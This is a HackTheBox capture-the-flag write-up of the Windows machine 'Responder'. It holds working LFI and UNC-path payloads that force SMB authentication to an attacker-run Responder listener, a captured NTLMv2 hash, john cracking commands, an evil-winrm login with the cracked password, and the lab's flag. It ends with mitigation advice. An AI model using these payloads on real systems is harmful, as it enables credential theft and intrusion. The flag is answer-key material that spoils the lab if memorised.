# 🚩 Responder - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/0-banner.png)


## 📝 General Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | ⚪ Very Easy |
| **OS** | 🪟 Windows |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold](#-2-initial-foothold) <br> [3: Privilege Escalation (Admin)](#-3-privilege-escalation-admin) <br> [4: Pwn3d !!](#-4-pwn3d-) |
| **Date** | 2026-04-19 |

---

## 🎯 Executive Summary

*Hello everyone!! This is Reef the Inquirer✨. Armed with patience and fueled by curiosity.* The attack chain on **Responder** begins with a **Local File Inclusion (LFI)** vulnerability in a PHP-based multilingual website running on Windows. The vulnerable `page` parameter was abused to inject a UNC path pointing to the attacker's machine running **Responder**, forcing the Windows server to authenticate via SMB and leak an **NTLMv2 hash** for the `Administrator` account. The hash was cracked offline using `john` with the `rockyou.txt` wordlist, yielding the plaintext password `badminton`. Finally, `evil-winrm` was used to establish a remote PowerShell session as Administrator, and the user flag was retrieved from Mike's Desktop.

---

## 🛠️ Tools Used

`Your mind and eyes!!`, `Nmap`, `Responder`, `John The Ripper`, `Evil-WinRM`

---

## 🔍 1: Reconnaissance & Enumeration

**Attacker IP:** `10.10.16.90`  
**Target IP:** `10.129.86.157`

### 1.1 Port Scanning

```bash
nmap -sS -sV -A -p- -T4 10.129.86.157
```

🧐 **Findings:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-18 19:24 EDT
Stats: 0:05:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 19:29 (0:00:00 remaining)
Nmap scan report for 10.129.86.157
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
```

**The scan revealed the following open ports:*

**Port 80 (HTTP):** Running Apache httpd 2.4.52 with PHP/8.1.1 on a 64-bit Windows environment.

**Port 5985 (HTTP):** Dedicated to Windows Remote Management (WinRM), running Microsoft HTTPAPI httpd 2.0.

**Port 7680:** tcpwrapped.


### 1.2 Web Enumeration

Initially, navigating to the target IP `http://10.129.86.157` on port 80 automatically redirects to `http://unika.htb`, revealing a website for a company named "UNIKA". While exploring the site, clicking the language toggle button to switch from English (EN) to German (DE) reveals a new URL:
```
http://unika.htb/index.php?page=german.html
```
This exposes a `page` parameter directly loads files from disk, and testing it uncovered a **Local File Inclusion (LFI)** vulnerability.


---

## 🚪 2: Initial Foothold

**Vulnerability Identifiaed:** *Local File Inclusion (LFI) leading to NTLM Hash Theft.*


We can test the `page` parameter with a path traversal payload targeting a known Windows system file:

```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```
The server returned the raw contents of the Windows `hosts` file (**LFI confirmed**).

For me, instead of merely reading local files, an LFI vulnerability on a Windows environment can be exploited to force the target server to authenticate against an external **remote SMB share**.

* First, `Responder` tool was started on the attacker's machine to listen for incoming authentication requests on the VPN interface:

```
sudo responder -I tun0
```

* Next, an HTTP payload was sent to the vulnerable `page` parameter, directing the target to fetch a non-existent file from the attacker's IP address:

```
[http://unika.htb/index.php?page=//10.10.16.90/somefile
```

* `Responder` successfully intercepted the authentication attempt and captured the `NTLMv2-SSP Hash` for the `RESPONDER\Administrator` user🚀

```
[SMB] NTLMv2-SSP Client   : 10.129.86.157
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2b60d05a1cdd0186:D1A0A2C82CFEB89948FCBAF2A7738FAE:01010000000000008039D9596FCFDC0161422D9A8536C900000000000200080058005A0056004C0001001E00570049004E002D003100520056004600410051005A0043004D003400550004003400570049004E002D003100520056004600410051005A0043004D00340055002E0058005A0056004C002E004C004F00430041004C000300140058005A0056004C002E004C004F00430041004C000500140058005A0056004C002E004C004F00430041004C00070008008039D9596FCFDC0106000400020000000800300030000000000000000100000000200000383275B506F5F720ED98591AD62F76890BFDF34DA14E418A4A2B8ACF1D4D80CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390030000000000000000000
```


---

## 🔓 3: Privilege Escalation (Admin)

### 4.1 Cracking the Hash

Saved the captured hash to `hash.txt` and ran `john` against it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> ✅ **Result:**
>
> ```
> badminton        (Administrator)
> 1g 0:00:00:00 DONE — 11.11g/s 45511p/s
> ```

### 4.2 Remote Shell via Evil-WinRM

With valid credentials, connected to the WinRM service on port 5985:

```bash
evil-winrm -i 10.129.86.157 -u administrator -p badminton
```

> ✅ **Result:** Remote PowerShell shell obtained as `RESPONDER\Administrator`.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
```

### 4.3 Retrieving the Flag

Navigated the file system to find the flag on Mike's Desktop:

```powershell
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode   Name
----   ----
d----- Administrator
d----- mike
d-r--- Public

*Evil-WinRM* PS C:\Users> cd mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

---

## 🏁 5: Pwn3d !!

| Flag | Hash |
| :--- | :--- |
| 🧑 User Flag | `ea81b7afddd03efaa0945333ed147fac` |
| 👑 Root Flag | `N/A — Very Easy machine (User flag only)` |

---

## 🛡️ Mitigation Recommendations

1. **Local File Inclusion:** Never pass user-supplied input directly to file-loading functions. Use a strict whitelist of allowed page names and map them server-side rather than loading arbitrary paths.
2. **UNC Path Injection / NTLM Leak:** Block outbound SMB traffic (ports 445/139) at the firewall level to prevent the server from connecting to attacker-controlled hosts. Enable `SMB Signing` to mitigate relay attacks.
3. **Weak Passwords:** Enforce a strong password policy. `badminton` is trivially cracked from `rockyou.txt` — require long, complex, unique credentials for all privileged accounts.
4. **Exposed WinRM:** Restrict port `5985` to trusted management IPs only. Remote management interfaces should never be reachable from untrusted networks.

---

*Created with 💜 by Reef*
